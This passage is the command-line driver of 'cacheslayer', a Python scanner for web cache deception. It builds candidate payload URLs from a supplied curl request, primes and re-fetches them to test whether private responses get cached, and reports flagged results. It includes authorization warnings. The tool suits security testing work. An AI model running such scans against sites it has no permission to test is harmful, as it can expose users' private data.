    parser.add_argument("--vendor-mode", choices=list(VENDOR_PROFILES.keys()),
                        help="Enable vendor-specific heuristics: cloudflare | fastly | akamai.")
    parser.add_argument("--prime-wait", type=float, default=5.0,
                        help="Seconds to wait after priming (default: 5).")
    parser.add_argument("--rechecks", type=int, default=1,
                        help="Number of rechecks if inconclusive (default: 1).")
    parser.add_argument("--recheck-wait", type=float, default=5.0,
                        help="Seconds to wait between rechecks (default: 5).")
    parser.add_argument("--threshold", type=float, default=0.7,
                        help="Score threshold for vulnerability (0..1). Default: 0.7")
    parser.add_argument("--verify-ssl", action="store_true",
                        help="Enable strict SSL certificate verification (default: off).")
    parser.add_argument("--out", help="Write JSON report to this path.")
    parser.add_argument("--html", help="Write HTML report (new layout) to this path.")

    args = parser.parse_args()

    print(c_head("== cacheslayer: Web Cache Deception (DIFF) =="))
    print(c_warn("[!] ONLY run this tool against systems you are authorized to test.\n"))

    # Get curl content
    curl_text = args.curl if args.curl else open(args.curl_file, "r", encoding="utf-8").read().strip()

    # Parse
    print(c_info("[*] Parsing curl command..."))
    try:
        req = parse_curl(curl_text)
    except Exception as e:
        print(c_bad(f"[!] Failed to parse curl: {e}"))
        sys.exit(1)
    print(c_ok(f"[+] Parsed: method={req.method} url={req.url}"))

    # Confirm authorization
    if input(c_info("Type YES to confirm you are authorized to test this target: ")).strip() != "YES":
        print(c_bad("[-] Aborted by user."))
        sys.exit(1)

    # Scanner
    scanner = WCDScanner(req,
                         verify_ssl=args.verify_ssl,
                         prime_wait=args.prime_wait,
                         rechecks=args.rechecks,
                         recheck_wait=args.recheck_wait,
                         threshold=args.threshold)

    # Baseline
    baseline = scanner.capture_baseline()

    # Payloads
    payloads = generate_candidate_payloads(baseline.url, vendor=args.vendor_mode)
    print(c_info(f"[*] Generated {len(payloads)} candidate payloads (vendor_mode={args.vendor_mode})."))

    # Run tests
    results: List[PayloadResult] = []
    flagged: List[PayloadResult] = []
    for purl in payloads:
        print(c_head(f"[•] Testing payload: {purl}"))
        res = scanner.test_payload_with_rechecks(purl, baseline)
        results.append(res)
        ev = ", ".join(res.cache_evidence) if res.cache_evidence else "—"
        status_str = f"prime={res.prime_status} atk={res.attacker_status}"
        if res.score >= args.threshold and res.victim_like:
            print(c_bad(f"    [VULNERABLE] sim={res.similarity:.3f} score={res.score:.3f} cache=[{ev}] ({status_str})"))
            flagged.append(res)
        else:
            print(c_warn(f"    [OK/NOISE]  sim={res.similarity:.3f} score={res.score:.3f} cache=[{ev}] ({status_str})"))

    # Summary
    print(c_head("\n=== SUMMARY ==="))
    if flagged:
        print(c_bad(f"[!] Found {len(flagged)} high-confidence vulnerable payload(s):"))
        for v in flagged:
            print(c_bad(f"  -> {v.payload_url}  score={v.score:.3f} sim={v.similarity:.3f} cache={'; '.join(v.cache_evidence) or '—'}"))
    else:
        print(c_ok("[+] No high-confidence vulnerable payloads detected at this threshold."))

    # JSON output
    if args.out:
        json_out = {
            "meta": {
                "target": baseline.url,
                "threshold": args.threshold,
                "vendor_mode": args.vendor_mode,
                "generated_at": int(time.time())
            },
            "baseline": {
                "url": baseline.url,
                "status": baseline.status,
                "body_len": baseline.body_len,
                "body_md5": baseline.body_md5,
                "headers": baseline.headers
            },
            "results": []
        }
        for r in results:
            json_out["results"].append({
                "payload_url": r.payload_url,
                "prime_status": r.prime_status,
                "attacker_status": r.attacker_status,
                "similarity": r.similarity,
                "score": r.score,
                "cache_evidence": r.cache_evidence,
                "attacker_headers": r.attacker_headers,
                "attacker_body_len": r.attacker_body_len,
                "attacker_body_md5": r.attacker_body_md5,
                "victim_like": r.victim_like,
                "notes": r.notes
            })
        with open(args.out, "w", encoding="utf-8") as fh:
            json.dump(json_out, fh, indent=2)
        print(c_info(f"[*] JSON report written to {args.out}"))

    # HTML output (new layout)
    if args.html:
        write_html_report(args.html, baseline, results, args.threshold)
        print(c_info(f"[*] HTML report written to {args.html}"))

    print(c_head("\nDone."))


# ============================================================================
# Entrypoint
# ============================================================================
if __name__ == "__main__":
    main()
